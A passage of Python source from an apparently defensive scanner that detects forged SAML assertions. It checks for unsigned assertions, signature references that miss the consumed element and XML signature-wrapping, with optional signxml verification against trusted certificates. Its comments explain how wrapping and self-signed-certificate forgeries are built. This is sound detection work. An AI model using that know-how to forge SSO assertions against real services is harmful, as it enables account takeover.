#   (c) signature-wrapping   — >1 saml:Assertion where the UNSIGNED consumed one supplies the identity
#       while a ds:Signature references a DIFFERENT assertion (the exact dual of wrap_assertion_xsw:
#       signed original kept verbatim, unsigned forged copy consumed).
#
# Near-zero-FP: a properly signed single assertion whose ds:Reference covers it (or an ancestor), a
# SAML metadata / request doc with no consumed NameID, malformed/empty XML, and a DOCTYPE/ENTITY doc
# (refused by the XXE-safe parser) all DO NOT fire. Full XML-DSig C14N/transform processing is
# deliberately NOT attempted (it needs lxml/signxml, out of scope) — anything softer than these coarse
# invariants stays a lead. Pure + deterministic (no clock/rng/io beyond the pure XXE-safe parse), so a
# confirmed forgery re-verifies OFFLINE from its retained XML certificate.
# NOTE: scanner.sso's XXE-safe parser + tree helpers are imported LAZILY inside the function — that
# module imports verify.adapter, so a module-load `verify -> scanner` import would be a cycle. The
# lazy import runs only when the oracle fires (never on the gate path), so no cycle and no gate drift.
# ---------------------------------------------------------------------------


# A ds:Reference/@URI of the form `#xpointer(id('X'))` — a spec-legal same-document XML-Signature
# reference (xmldsig-core 4.4.3) that selects element X by id, EQUIVALENT to the bare `#X` shorthand.
_SAML_XPTR_ID_RE = re.compile(r"^xpointer\(\s*id\(\s*(['\"])(?P<id>.+?)\1\s*\)\s*\)$")
# a whole-document XPointer `#xpointer(/)` — equivalent to URI="" (the enveloped whole-doc reference).
_SAML_XPTR_ROOT_RE = re.compile(r"^xpointer\(\s*/\s*\)$")
# a plain bare-name reference `#NCName` (no parens / slashes / xpointer) we can resolve to an id.
_SAML_BARENAME_RE = re.compile(r"^[A-Za-z_][\w.\-]*$")


def _saml_resolve_ref(uri: str) -> tuple[str, str | None]:
    """Resolve a ds:Reference/@URI to ('whole', None) | ('id', <name>) | ('unknown', None).

    Only same-document forms whose covered id/scope is UNAMBIGUOUS from the URI STRING are resolved:
    URI="" and `#xpointer(/)` (whole document), `#NCName` and `#xpointer(id('NCName'))` (that id).
    Everything else — a URI-less/transform-selected reference, an XPath/full-XPointer expression, a
    cross-document URI — is 'unknown': the oracle then REFUSES to assert a coverage mismatch on it
    (near-zero-FP; c14n/transform semantics are deliberately out of scope, so a reference we cannot
    resolve is NOT evidence the signature fails to cover the consumed element)."""
    if uri == "":
        return ("whole", None)
    if not uri.startswith("#"):
        return ("unknown", None)
    frag = uri[1:].strip()
    if _SAML_XPTR_ROOT_RE.match(frag):
        return ("whole", None)
    m = _SAML_XPTR_ID_RE.match(frag)
    if m:
        return ("id", m.group("id"))
    if _SAML_BARENAME_RE.match(frag):
        return ("id", frag)
    return ("unknown", None)


# ---------------------------------------------------------------------------
# OPT-IN cryptographic XML-DSig escalation (the `saml` extra). Mirrors jwt_forgery_oracle's
# candidate_keys: it runs ONLY when the operator supplies a TRUSTED IdP cert AND `signxml` is
# importable. It NEVER runs on the gate path (no benchmark carries saml_xml, let alone a trusted
# cert), so the structural oracle stays byte-identical when this branch is dormant.
#
# THE HARD FP LINES this helper holds (near-zero-FP is cardinal — a valid, trusted-key-signed
# assertion must NEVER read as a forgery):
#   1. NEVER trust the EMBEDDED cert. The signature's own ds:X509Certificate (KeyInfo) is attacker-
#      controlled — a self-signed forgery "verifies" against it. We pin verification to the
#      OPERATOR-PROVIDED trusted PEM via signxml's `x509_cert=` (confirmed: supplying x509_cert
#      overrides the document's embedded KeyInfo as the trust anchor). No trusted cert -> DORMANT.
#   2. REFUSE-TO-ADJUDICATE on can't-verify. We FIRE only on signxml's DEFINITIVE cryptographic-
#      invalidity exceptions — InvalidSignature ("Signature verification failed", wrong signer) and
#      its subclass InvalidDigest ("Digest mismatch", tampered content). We REFUSE (stay structural)
#      on InvalidCertificate (a subclass of InvalidSignature — cert trust/expiry, NOT a bad signature),
#      InvalidInput (a ValueError — no signature / unsupported SignatureMethod / transform), a parse
#      error, or ANY other exception. "Couldn't verify" is NOT "forged". signxml's mature c14n does the
#      canonicalization — we never hand-roll it.
#   3. A REFERENCE-COUNT mismatch is POLICY, not crypto-invalidity. signxml's default
#      SignatureConfiguration pins `expect_references=1`, so a spec-legal multi-reference / dual-signed
#      (Response AND Assertion both signed) doc — a GENUINELY valid signature — raises InvalidSignature
#      ("Expected to find 1 references, but found N"). We verify with `expect_references=False` so that
#      benign shape verifies instead of firing; the STRUCTURAL branch (not signxml's count) is where we
#      reason about which element a reference covers (XSW). Relaxing the count is strictly FP-REDUCING:
#      it can only prevent a false invalid, never manufacture one.
#   4. WHITESPACE / CAPTURE FIDELITY. Exclusive-C14N does NOT normalize inter-element whitespace text
#      nodes (significant per XML-DSig), so a valid assertion pretty-printed / re-indented in capture
#      (xmllint --format, browser devtools, SAML-tracer) raises InvalidSignature/InvalidDigest. Before
#      calling a raw definitive-invalid a forgery we RE-VERIFY a whitespace-normalized form
#      (`_saml_ws_normalized`); if THAT verifies, a trusted key signed it (capture artifact, NOT forgery)
#      -> verified. Stripping only inter-element whitespace can heal a whitespace false-invalid but can
#      never hide a content-tamper (that is not a whitespace difference), so no true positive is lost.
_SAML_CRYPTO_INPUT_CAP = 5 * 1024 * 1024   # bound the XML fed to signxml/lxml (DoS-safe over untrusted input)


def _saml_ws_normalized(text: str) -> str | None:
    """Re-serialize ``text`` with inter-element indentation whitespace stripped (lxml
    ``remove_blank_text``), or ``None`` if it will not parse. This reconstructs the canonical form a
    signature covered when the captured bytes were merely pretty-printed / re-indented, so a crypto
    re-verify of THIS form separates a whitespace/capture artifact (re-verifies) from a genuine forgery
    (still fails). Stripping removes only whitespace-ONLY text nodes BETWEEN elements — never element
    text content (base64 SignatureValue/DigestValue/X509Certificate survives) and never non-whitespace
    — so it can HEAL a whitespace-induced false-invalid but can NEVER hide a content-tamper forgery.
    XXE-safe (``resolve_entities=False``, ``no_network=True``); the caller already refused DTD/ENTITY."""
    try:
        from lxml import etree  # noqa: PLC0415 (signxml pulls in lxml; present iff the crypto branch runs)
        parser = etree.XMLParser(remove_blank_text=True, resolve_entities=False, no_network=True)
        return etree.tostring(etree.fromstring(text.encode("utf-8", "replace"), parser)).decode("utf-8", "replace")
    except Exception:
        return None


def _saml_verify_one(text: str, pem: str, verifier: Any, cfg: Any, sx_ex: Any) -> tuple[str, str]:
    """Classify ONE (cert, xml) crypto verification as ``(classification, detail)`` where classification
    is ``"verified"`` | ``"definitive"`` | ``"indeterminate"``.

      * ``verified``      — the trusted cert cryptographically verifies the signature.
      * ``definitive``    — a DEFINITIVE cryptographic invalidity (InvalidSignature / InvalidDigest:
        wrong signer / tampered digest). This is the ONLY fire-eligible outcome.
      * ``indeterminate`` — InvalidCertificate (cert trust/expiry, NOT a bad sig), InvalidInput /
        unsupported-algorithm / unsupported-transform / parse / config error, or anything else
        ("couldn't verify" — never "forged").

    ``cfg`` relaxes signxml's ``expect_references`` COUNT policy (FP line 3) so a spec-legal
    multi-reference / dual-signed doc verifies instead of raising a spurious InvalidSignature."""
    try:
        verifier().verify(text, x509_cert=pem, expect_config=cfg)
        return ("verified", "")
    except sx_ex.InvalidCertificate as e:   # subclass of InvalidSignature — cert trust/expiry, NOT a bad sig
        return ("indeterminate", f"cert_untrusted:{type(e).__name__}")
    except (sx_ex.InvalidDigest, sx_ex.InvalidSignature) as e:   # DEFINITIVE cryptographic invalidity
        return ("definitive", f"{type(e).__name__}: {str(e)[:160]}")
    except Exception as e:   # InvalidInput / unsupported alg-or-transform / parse / config / anything
        return ("indeterminate", f"indeterminate:{type(e).__name__}")


def _saml_crypto_verdict(text: str, candidate_certs: Sequence[str]) -> tuple[str, str, dict[str, Any]]:
    """Cryptographically verify the captured SAML XML's XML-DSig signature against the OPERATOR-SUPPLIED
    TRUSTED cert(s), returning ``(verdict, detail, observed_extra)`` where verdict is one of:

      * ``"unavailable"`` — no trusted cert supplied, or ``signxml`` is not importable. The crypto branch
        is DORMANT; the oracle stays structural-only (byte-identical).
      * ``"verified"``    — at least one trusted cert cryptographically verifies the signature. The
        signature was produced by a trusted IdP key (NOT a forgery on that dimension).
      * ``"invalid"``     — no trusted cert verifies, AND every failure was a DEFINITIVE cryptographic
        invalidity (InvalidSignature / InvalidDigest) with ZERO indeterminate outcomes: the signature is
        provably NOT from any trusted key (wrong signer / tampered digest). This is the fire signal.
      * ``"refuse"``      — could not conclusively adjudicate (an InvalidCertificate trust/expiry outcome,
        an InvalidInput / unsupported-algorithm / unsupported-transform / parse / config error, or any
        other exception on at least one cert). "Couldn't verify" is NOT "forged" — the oracle refuses.

    Pure w.r.t. its inputs and deterministic (signxml verification of fixed bytes against a fixed cert is
    reproducible), so a fire re-verifies OFFLINE from the retained XML + trusted certs. NEVER raises.

    FP guards 3 (relax `expect_references` — a reference-COUNT mismatch is policy, not crypto-invalidity)
    and 4 (a raw definitive-invalid is re-checked against a WHITESPACE-NORMALIZED form before it is
    called a forgery — a pretty-print/capture artifact re-verifies) are applied per the module note."""
    certs = [c for c in (_coerce_text(x) for x in (candidate_certs or ())) if c.strip()]
    if not certs:
        return ("unavailable", "no operator-supplied trusted cert — crypto branch dormant", {})
    try:  # guarded import (opt-in `saml` extra) — absent => dormant, structural-only
        from signxml import SignatureConfiguration, XMLVerifier  # noqa: PLC0415
        from signxml import exceptions as sx_ex  # noqa: PLC0415
    except Exception:  # pragma: no cover - exercised via monkeypatch in tests
        return ("unavailable", "signxml not importable (opt-in 'saml' extra absent)", {})

    # XXE + DoS re-guard (defense-in-depth; the oracle's upstream safe_parse_xml already enforced this,
    # so a DOCTYPE/ENTITY/oversize doc never reaches here — but keep the helper self-contained + safe).
    raw = text.encode("utf-8", "replace")
    if len(raw) > _SAML_CRYPTO_INPUT_CAP:
        return ("refuse", f"XML exceeds the {_SAML_CRYPTO_INPUT_CAP}-byte crypto bound — declining", {})
    low = raw.lower()
    if b"<!doctype" in low or b"<!entity" in low:
        return ("refuse", "DTD/ENTITY present — declining crypto verify (XXE-safe)", {})

    # FP line 3: a reference-COUNT mismatch is policy, not crypto-invalidity — accept any count so a
    # spec-legal multi-reference / dual-signed doc verifies instead of firing a spurious InvalidSignature.
    cfg = SignatureConfiguration(expect_references=False)
    # FP line 4: the whitespace/capture-fidelity re-check form (built once, reused per cert).
    norm = _saml_ws_normalized(text)

    definitive = 0
    indeterminate = 0
    first_invalid = ""
    outcomes: list[str] = []
    for pem in certs:
        # x509_cert pins the trust anchor to the OPERATOR's cert and OVERRIDES the document's own embedded
        # KeyInfo cert (FP line 1). Success => a trusted key signed it.
        cls, detail = _saml_verify_one(text, pem, XMLVerifier, cfg, sx_ex)
        if cls == "verified":
            return ("verified", "signature verifies against a supplied trusted cert",
                    {"crypto_outcome": "verified", "trusted_certs": len(certs)})
        if cls == "definitive" and norm is not None and norm != text:
            # FP line 4: a raw definitive-invalid MIGHT be only whitespace/pretty-print disturbance.
            # Re-verify the whitespace-normalized form before calling it a forgery.
            cls2, detail2 = _saml_verify_one(norm, pem, XMLVerifier, cfg, sx_ex)
            if cls2 == "verified":   # a trusted key DID sign it — the raw failure was capture whitespace
                return ("verified", "signature verifies against a supplied trusted cert (whitespace-normalized)",
                        {"crypto_outcome": "verified", "trusted_certs": len(certs), "note": "ws_normalized"})
            if cls2 != "definitive":   # normalized form is not conclusively invalid -> refuse for this cert
                cls, detail = "indeterminate", f"ws_indeterminate:{detail2}"
            # else: still definitive under BOTH the raw AND the whitespace-normalized form -> genuine.
        if cls == "definitive":
            definitive += 1
            if not first_invalid:
                first_invalid = detail
            outcomes.append(f"definitive_invalid:{detail[:48]}")
        else:
            indeterminate += 1
            outcomes.append(detail or "indeterminate")

    # FIRE only when EVERY trusted cert gave a conclusive "not signed by this key" (under BOTH the raw and
    # the whitespace-normalized form) AND nothing was indeterminate. A single indeterminate outcome (a
    # cert we could not evaluate — it MIGHT be the real signer) forces a REFUSE: "couldn't verify" is
    # never "forged".
    if definitive >= 1 and indeterminate == 0:
        return ("invalid", first_invalid,
                {"crypto_outcome": "invalid_signature", "trusted_certs": len(certs),
                 "signxml_error": first_invalid, "outcomes": outcomes})
    return ("refuse",
            f"inconclusive crypto verify ({definitive} definitive-invalid, {indeterminate} indeterminate)",
            {"crypto_outcome": "refuse", "trusted_certs": len(certs), "outcomes": outcomes})


def saml_forgery_oracle(xml: Any, *, candidate_certs: Sequence[str] = ()) -> OracleSignal:
    """Fire (SAML_STRUCTURAL_FORGERY) iff the captured SAML Response ``xml`` exhibits a coarse, c14n-free
    STRUCTURAL forgery invariant a validly signed assertion cannot: (a) the assertion carrying the
    consumed NameID has ZERO ds:Signature; (b) every ds:Reference/@URI points at an id OTHER than the
    consumed assertion or an ancestor (the signature does not cover the consumed element); or (c) the
    signature-wrapping shape (>1 assertion, the unsigned consumed one supplies the identity while a
    signature references a DIFFERENT assertion — the dual of scanner.sso.wrap_assertion_xsw). A properly
    signed single assertion, a doc with no consumed NameID, malformed/empty XML, and a DOCTYPE/ENTITY doc
    (XXE-refused) all DO NOT fire (near-zero-FP). Pure + deterministic; re-verifies offline from the XML.

    OPT-IN cryptographic escalation: when ``candidate_certs`` (the OPERATOR-PROVIDED TRUSTED IdP PEM
    cert(s)) is supplied AND ``signxml`` is importable, the structural NON-FIRE paths (a signature that
    structurally COVERS the consumed element, or a coverage picture this oracle cannot string-decide) are
    ADDITIONALLY escalated to a real XML-DSig verification against those trusted anchors — firing
    (proof=``invalid_signature``) ONLY when the signature is DEFINITIVELY cryptographically invalid
    (wrong signer / tampered digest). The signature's OWN embedded ds:X509Certificate is NEVER trusted
    (attacker-controlled), and a signature signxml cannot verify (unsupported transform/algorithm, cert
    trust/expiry, parse/config error) is REFUSED, not fired. No trusted cert (or signxml absent) => the
    escalation is DORMANT and this stays byte-identical to the structural-only oracle."""
    kind = OracleKind.SAML_STRUCTURAL_FORGERY
    # Lazy import (see the module-note above) — a parse error at import stays a non-fire, never a raise.
    try:
        from ..scanner.sso import (  # noqa: PLC0415 (intentional lazy import to avoid a cycle)
            XxeBlocked,
            _NS_ASSERT,
            _NS_DS,
            _parent_map,
            safe_parse_xml,
            saml_nameid,
        )
    except Exception:  # pragma: no cover - defensive; the helpers ship with the package
        return OracleSignal(kind=kind, fired=False, confidence=0.0,
                            evidence="SAML parse helpers unavailable — cannot adjudicate")

    text = xml if isinstance(xml, str) else _coerce_text(xml)

    def _crypto_escalation() -> OracleSignal | None:
        """The opt-in XML-DSig escalation, evaluated ONLY at the structural NON-FIRE points below. Returns
        a fired signal iff the signature is DEFINITIVELY cryptographically invalid against a trusted cert;
        otherwise None (verified / refuse / dormant) so the caller returns the structural verdict
        unchanged. With no candidate_certs it short-circuits to 'unavailable' -> None -> byte-identical."""
        verdict, detail, extra = _saml_crypto_verdict(text, candidate_certs)
        if verdict != "invalid":
            return None
        return OracleSignal(
            kind=kind, fired=True, confidence=0.97,
            evidence=(
                "cryptographic XML-DSig verification: the ds:Signature is DEFINITIVELY INVALID against the "
                f"operator-supplied trusted cert(s) — {detail} — a forged/tampered signature no trusted IdP "
                "key produced (re-verify: signxml XMLVerifier.verify(xml, x509_cert=trusted_pem) raises "
                "InvalidSignature/InvalidDigest; the document's OWN embedded KeyInfo cert is NOT the anchor)"),
            observed={"proof": "invalid_signature", **extra})

    try:
        # XXE-safe: refuses any DOCTYPE/ENTITY + bounds size; a malicious-entity doc never resolves.
        root = safe_parse_xml(text)
    except XxeBlocked as exc:
        return OracleSignal(kind=kind, fired=False, confidence=0.0,
                            evidence=f"XML refused by the XXE-safe parser ({exc}) — non-fire",
                            observed={"parse": "refused"})
    except Exception as exc:  # any other parse failure — never raise, stay a lead
        return OracleSignal(kind=kind, fired=False, confidence=0.0,
                            evidence=f"XML not parseable ({type(exc).__name__}) — non-fire",
                            observed={"parse": "error"})

    ASSERT = f"{{{_NS_ASSERT}}}"
    DS = f"{{{_NS_DS}}}"

    # The consumed identity: scanner.sso.saml_nameid's first-NameID-with-text (what an SP that consumes
    # the first assertion authenticates as). No consumed identity -> nothing to adjudicate (metadata /
    # AuthnRequest / a doc with no NameID) -> non-fire.
    nameid_text = saml_nameid(root)
    if nameid_text is None:
        return OracleSignal(kind=kind, fired=False, confidence=0.0,
                            evidence="no saml:NameID with text — no consumed SSO identity to adjudicate",
                            observed={"reason": "no_nameid"})
    consumed_nameid_el = next(
        (el for el in root.iter(f"{ASSERT}NameID") if el.text == nameid_text), None)

    pmap = _parent_map(root)

    def _ancestors(el: Any):
        cur = pmap.get(el)
        while cur is not None:
            yield cur
            cur = pmap.get(cur)

    # The saml:Assertion that ENCLOSES the consumed NameID (the consumed assertion). A NameID outside any
    # Assertion (e.g. a bare LogoutRequest subject) is not an authentication assertion -> non-fire.
    consumed_assertion = next(
        (a for a in _ancestors(consumed_nameid_el) if a.tag == f"{ASSERT}Assertion"), None)
    if consumed_assertion is None:
        return OracleSignal(
            kind=kind, fired=False, confidence=0.0,
            evidence="the consumed saml:NameID is not inside a saml:Assertion — not an authentication "
                     "assertion (stays a lead)",
            observed={"reason": "nameid_outside_assertion"})

    assertions = list(root.iter(f"{ASSERT}Assertion"))
    signatures = list(root.iter(f"{DS}Signature"))

    def _id_of(el: Any) -> str | None:
        return el.get("ID") or el.get("AssertionID") or el.get("ResponseID")

    consumed_id = _id_of(consumed_assertion)

    # ---- invariant (a): NO signature anywhere over the consumed assertion --------------------------
    if not signatures:
        return OracleSignal(
            kind=kind, fired=True, confidence=0.9,
            evidence=(f"the saml:Assertion (ID={consumed_id!r}) carrying the consumed NameID has ZERO "
                      f"ds:Signature in the whole message — an unsigned assertion is structurally "
                      f"forgeable (anyone can mint it; re-verify: 0 ds:Signature over {len(assertions)} "
                      f"assertion(s))"),
            observed={"proof": "unsigned_assertion", "assertions": len(assertions),
                      "signatures": 0, "consumed_assertion_id": consumed_id})

    # Signatures exist — determine whether ANY covers the consumed assertion or one of its ancestors.
    referenced_ids: set[str] = set()
    whole_doc_sig = False       # a ds:Reference URI="" / #xpointer(/) covers the WHOLE document
    unadjudicable_ref = False   # a reference we cannot resolve to a bare id/whole-doc (URI-less +
                                # transform-selected, XPath, full XPointer): its coverage is UNKNOWN, so
                                # we must NOT treat it as a mismatch (the review's XPointer/URI-less FP).
    for sig in signatures:
        for ref in sig.iter(f"{DS}Reference"):
            uri = ref.get("URI")
            if uri is None:
                unadjudicable_ref = True   # URI-less: selects nodes via Transforms — not string-decidable
                continue
            kind_ref, rid = _saml_resolve_ref(uri.strip())
            if kind_ref == "whole":
                whole_doc_sig = True
            elif kind_ref == "id":
                referenced_ids.add(rid)
            else:
                unadjudicable_ref = True

    consumed_chain_ids: set[str] = set()
    if consumed_id:
        consumed_chain_ids.add(consumed_id)
    for anc in _ancestors(consumed_assertion):
        aid = _id_of(anc)
        if aid:
            consumed_chain_ids.add(aid)

    covered = whole_doc_sig or bool(referenced_ids & consumed_chain_ids)
    if covered:
        # Structurally the signature covers the consumed element — but "covers by URI" is not "valid
        # crypto". If a trusted cert was supplied, escalate: a wrong-signer or tampered-digest forgery
        # that structurally looks properly signed is caught here (fire); anything short of a definitive
        # cryptographic invalidity leaves this the structural non-fire below (byte-identical when dormant).
        esc = _crypto_escalation()
        if esc is not None:
            return esc
        return OracleSignal(
            kind=kind, fired=False, confidence=0.0,
            evidence=("a ds:Signature covers the consumed assertion (or an ancestor) — properly signed "
                      "(stays a lead; c14n/transform validity is deliberately not asserted here)"),
            observed={"assertions": len(assertions), "signatures": len(signatures),
                      "consumed_assertion_id": consumed_id, "referenced_ids": sorted(referenced_ids),
                      "whole_doc_sig": whole_doc_sig})

    # NOT covered. Distinguish the wrapping shape (>1 assertion, a signed sibling) from a plain mismatch.
    other_ids: set[str] = set()
    for a in assertions:
        if a is not consumed_assertion:
            aid = _id_of(a)
            if aid:
                other_ids.add(aid)
    consumed_has_own_sig = any(True for _ in consumed_assertion.iter(f"{DS}Signature"))

    # ---- invariant (c): signature-wrapping shape (the dual of wrap_assertion_xsw) ------------------
    # Only when the reference set is FULLY resolvable — an unadjudicable (transform/xpath) reference
    # could be the one that actually covers the consumed assertion, so we refuse to assert wrapping.
    if len(assertions) >= 2 and not consumed_has_own_sig and not unadjudicable_ref and (referenced_ids & other_ids):
        signed_siblings = sorted(referenced_ids & other_ids)
        return OracleSignal(
            kind=kind, fired=True, confidence=0.95,
            evidence=(f"signature-wrapping: {len(assertions)} saml:Assertion elements — the UNSIGNED one "
                      f"(ID={consumed_id!r}) supplies the consumed NameID while a ds:Signature references "
                      f"a DIFFERENT assertion {signed_siblings} — the signed element is not the consumed "
                      f"one (re-verify: consumed id not in the signed Reference set)"),
            observed={"proof": "signature_wrapping", "assertions": len(assertions),
                      "consumed_assertion_id": consumed_id, "referenced_ids": sorted(referenced_ids),
                      "signed_sibling_ids": signed_siblings})

    # ---- invariant (b): ds:Reference/@URI does not cover the consumed element ----------------------
    # Fire ONLY when EVERY reference resolved to a bare id/whole-doc form (nothing unadjudicable) and
    # none of them covers the consumed chain. An unresolvable reference (transform/xpath) means the
    # coverage picture is incomplete — we cannot PROVE a mismatch, so we refuse (the review's FP: a
    # validly-signed assertion using `#xpointer(id('X'))` / `#xpointer(/)` / a URI-less transform ref).
    if consumed_chain_ids and referenced_ids and not unadjudicable_ref:
        return OracleSignal(
            kind=kind, fired=True, confidence=0.9,
            evidence=(f"ds:Reference/@URI covers {sorted(referenced_ids)} but the consumed assertion and "
                      f"its ancestors are {sorted(consumed_chain_ids)} — DISJOINT, so no signature covers "
                      f"the consumed element (re-verify: reference set and consumed chain do not intersect)"),
            observed={"proof": "reference_mismatch", "assertions": len(assertions),
                      "consumed_chain_ids": sorted(consumed_chain_ids),
                      "referenced_ids": sorted(referenced_ids)})

    # Signatures present but coverage is not string-decidable — no by-id references, the consumed
    # assertion has no id to compare, OR at least one reference is a transform/xpath/full-XPointer form
    # this oracle deliberately does not parse (c14n out of scope). Refuse rather than guess (near-zero-FP).
    # But if a trusted cert was supplied, signxml's mature c14n may resolve exactly the transforms this
    # oracle punts on: escalate — fire on a definitive cryptographic invalidity, else stay this refusal.
    esc = _crypto_escalation()
    if esc is not None:
        return esc
    return OracleSignal(
        kind=kind, fired=False, confidence=0.0,
        evidence=("no c14n-free structural forgery invariant holds (signatures present but no provable "
                  "reference mismatch / wrapping shape" +
                  ("; a transform/xpath/URI-less reference is present whose coverage this oracle does not "
                   "adjudicate" if unadjudicable_ref else "") + ") — inconclusive, stays a lead"),
        observed={"assertions": len(assertions), "signatures": len(signatures),
                  "consumed_assertion_id": consumed_id, "referenced_ids": sorted(referenced_ids),
                  "whole_doc_sig": whole_doc_sig, "unadjudicable_ref": unadjudicable_ref})
